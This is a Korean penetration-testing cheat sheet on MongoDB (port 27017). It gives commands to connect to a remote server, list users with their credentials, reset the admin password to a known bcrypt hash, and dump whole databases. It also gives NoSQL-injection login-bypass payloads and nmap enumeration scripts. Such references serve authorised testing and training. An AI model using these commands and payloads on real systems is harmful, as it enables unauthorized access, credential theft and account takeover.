---
sidebar_position: 16
---

# MongoDB - 27017

## 기본 정보

**포트**: 27017

MongoDB는 NoSQL 문서 지향 데이터베이스입니다.

## 연결

```bash
# 로컬 연결
mongo

# 원격 연결
mongo "mongodb://<RHOST>:27017"

# 인증 사용
mongo "mongodb://<USERNAME>:<PASSWORD>@<RHOST>:27017"

# 특정 데이터베이스
mongo "mongodb://<RHOST>:27017/<DATABASE>"
```

## 기본 명령어

```javascript
// 데이터베이스 목록
> show dbs

// 데이터베이스 사용
> use <DATABASE>

// 컬렉션 목록
> show tables
> show collections

// 시스템 키 확인
> db.system.keys.find()

// 사용자 조회
> db.users.find()
> db.getUsers()
> db.getUsers({showCredentials: true})

// 계정 조회
> db.accounts.find()
> db.accounts.find().pretty()

// Admin DB 사용
> use admin
```

## 비밀번호 재설정

```javascript
// 사용자 비밀번호를 "12345"로 변경
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

## 데이터 추출

```javascript
// 전체 데이터
> db.collection.find()

// 특정 필드만
> db.collection.find({}, {username:1, password:1})

// 조건부 조회
> db.collection.find({username: "admin"})

// 정렬
> db.collection.find().sort({created: -1})

// 개수 제한
> db.collection.find().limit(10)
```

## NoSQL Injection

```javascript
// 로그인 우회
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 정규식 사용
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

## Nmap

```bash
# MongoDB 버전 확인
sudo nmap -p27017 -sV <RHOST>

# MongoDB 정보 수집
sudo nmap -p27017 --script mongodb-info <RHOST>

# MongoDB 데이터베이스 열거
sudo nmap -p27017 --script mongodb-databases <RHOST>
```

## mongodump / mongorestore

```bash
# 전체 백업
mongodump --host <RHOST> --port 27017

# 특정 데이터베이스 백업
mongodump --host <RHOST> --port 27017 --db <DATABASE>

# 복원
mongorestore --host <RHOST> --port 27017 dump/
```

## 참고

- 인증 없는 접근 확인
- 기본 자격증명 테스트
- NoSQL Injection 시도
- 민감한 데이터 확인 (users, accounts, credentials 등)
- JavaScript 실행 가능 여부
